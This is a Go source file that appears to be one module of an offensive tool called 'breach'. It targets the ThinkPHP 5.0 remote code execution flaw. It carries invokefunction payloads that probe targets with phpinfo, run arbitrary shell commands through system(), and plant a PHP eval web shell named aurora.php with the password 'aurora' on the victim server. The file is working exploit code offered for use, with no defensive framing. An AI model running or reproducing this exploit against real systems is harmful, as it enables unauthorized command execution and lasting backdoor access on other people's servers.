package thinkphp

import (
	"breach/internal/util"
	"io"
	"net/http"
	"strings"
)

type TP50Module struct {
	BaseUrl            string
	feature            string
	moduleList         []string
	currentModule      string
	checkVulPayloadUrl []string
	checkStr           string
}

func NewTP50Module(baseUrl string) *TP50Module {
	return &TP50Module{
		BaseUrl:    baseUrl,
		feature:    "ThinkPHP 5.0 RCE",
		moduleList: []string{"manage", "admin", "api"},
		checkVulPayloadUrl: []string{
			"/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1",
			"/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()"},
		checkStr: "PHP Version",
	}
}

func (t *TP50Module) CheckVul() *util.Response {
	for _, s := range t.moduleList {
		resp, err := http.Get(t.BaseUrl + "/?=/" + s)
		if err != nil {
			return util.Fail(err.Error())
		}
		if resp.StatusCode == 200 {
			t.currentModule = s
			break
		}
	}
	if t.currentModule == "" {
		return util.Fail("no vulnerable")
	}
	for _, payloadUrl := range t.checkVulPayloadUrl {
		resp, err := http.Get(t.BaseUrl + "/?s=/" + t.currentModule + payloadUrl)
		if err != nil {
			return util.Fail(err.Error())
		}
		bytes, err := io.ReadAll(resp.Body)
		if err != nil {
			return util.Fail(err.Error())
		}
		if strings.Contains(string(bytes), t.checkStr) {
			return util.Success("success", t.feature)
		}
	}
	return util.Fail("no vulnerable")
}

func (t *TP50Module) ExecVul(cmd string) *util.Response {
	payloadUrl := t.BaseUrl + "/?s=" + t.currentModule + "/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=" + cmd
	resp, err := http.Get(payloadUrl)
	if err != nil {
		return util.Fail(err.Error())
	}
	bytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return util.Fail(err.Error())
	}
	return util.Success("success", string(bytes))
}

func (t *TP50Module) GetShell() *util.Response {
	payloadUrl := t.BaseUrl + "/?s=" + t.currentModule + "/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo '<?php @eval($_POST['aurora'])?>' >>aurora.php"
	resp, err := http.Get(payloadUrl)
	if err != nil {
		return util.Fail(err.Error())
	}
	if resp.StatusCode == 200 {
		response, err := http.Get(t.BaseUrl + "/aurora.php   Pass:aurora")
		if err != nil {
			return util.Fail(err.Error())
		}
		if response.StatusCode == 200 {
			return util.Success("success", t.BaseUrl+"/aurora.php   Pass:aurora")
		}
	}
	return util.Fail("no vulnerable")
}
